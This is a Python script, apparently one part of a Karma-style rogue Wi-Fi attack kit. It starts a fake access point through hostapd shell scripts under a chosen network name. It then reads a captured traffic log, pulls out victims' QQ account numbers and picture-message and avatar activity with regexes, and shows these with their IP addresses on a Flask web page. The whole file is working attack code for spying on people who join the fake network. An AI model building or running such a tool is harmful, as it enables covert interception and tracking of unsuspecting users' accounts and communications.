# coding:utf-8


# 先运行karma.py

import os, sys, signal, re
# from scapy.all import sniff
from time import sleep
from multiprocessing import Process
from flask import Flask,url_for, render_template

app = Flask(__name__)
display_data = {}

def parse_logfile(log_file="./credentials.txt"):
    with open(log_file, "r") as fr:
        while True:
            lines = fr.readlines()
            if lines:
                data = extract(lines)
                if data:
                    with open("qq.txt", "a") as qq:
                        for item in data:
                            qq.write(" ".join(item)+"\n")
                        print "Yes"
            else:
                sleep(2)


def extract(lines):
    result = []
    for line in lines:
        qq_data1 = re.findall("INFO:root:\[(.*?)\] GET \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/(\w*)_new/(.*?)/(.*?)vuin=(.*?)&", line)
        qq_data2 = re.findall("INFO:root:\[(.*?)\] GET \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/gh/(\d*)/\d*/100\?mType=QQHeadIcon&t=", line)
        if qq_data1 :
            qq_data1 = qq_data1[0]
            a = (qq_data1[0], qq_data1[1], qq_data1[2], qq_data1[4])
            if a not in result:
                result.append(a)
            continue
        if qq_data2:
            qq_data2 = qq_data2[0]
            if qq_data2 not in result:
                result.append(qq_data2)
    return result

@app.route("/", methods=['GET'])
def index():
    return render_template("display.html")

@app.route("/api/content", methods=["GET"])
def get_content():
    qq_data = open("qq.txt", "r").readlines()
    result = '<table class="table  table-bordered">'
    result += "<thead><tr><th>IP</th><th>message</th><th>qq number</th><tr></thead><tbody>"
    for line in qq_data:
        data = line.split(' ')
        if len(data) == 4:
            if data[1] == "gchatpic":
                result += "<tr><td>"+data[0]+"</td><td> a picture message from "+data[3]+"'s group</td><td> send by "+data[2]+"</td></tr>"
            if data[1] == "offpic":
                result += "<tr><td>"+data[0]+"</td><td> a picture message from "+data[3]+"'s friend </td><td> send by "+data[2]+"</td></tr>"
        if len(data) == 2:
            result += "<tr><td>"+data[0]+"</td><td> a headicon </td><td>"+data[1]+"</td></tr>"

    result += "</tbody></table>"
    return result

def _start():
    os.system("sudo ./hostpad.sh "+iface+" "+wifi_name)


def safe_exit(signal, frame):
    p.terminate()
    p.join()
    loghandler.terminate()
    loghandler.join()
    flask_process.terminate()
    flask_process.join()
    os.system("sudo ./safe_exit.sh "+iface)
    print "[*]: sudo ./safe_exit.sh "+iface
    sys.exit(0)


def flask_run():
    app.run()

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print "Usage: sudo python %s <iface> <wifi_name>" % sys.argv[0]
        sys.exit(1)
    iface = sys.argv[1]
    wifi_name = sys.argv[2]

    p = Process(target=_start)
    p.start()
    sleep(7)
    os.system("sudo ./hostpad2.sh")
    signal.signal(signal.SIGINT, safe_exit)

    loghandler = Process(target=parse_logfile)
    loghandler.start()

    flask_process = Process(target=flask_run)
    flask_process.start()
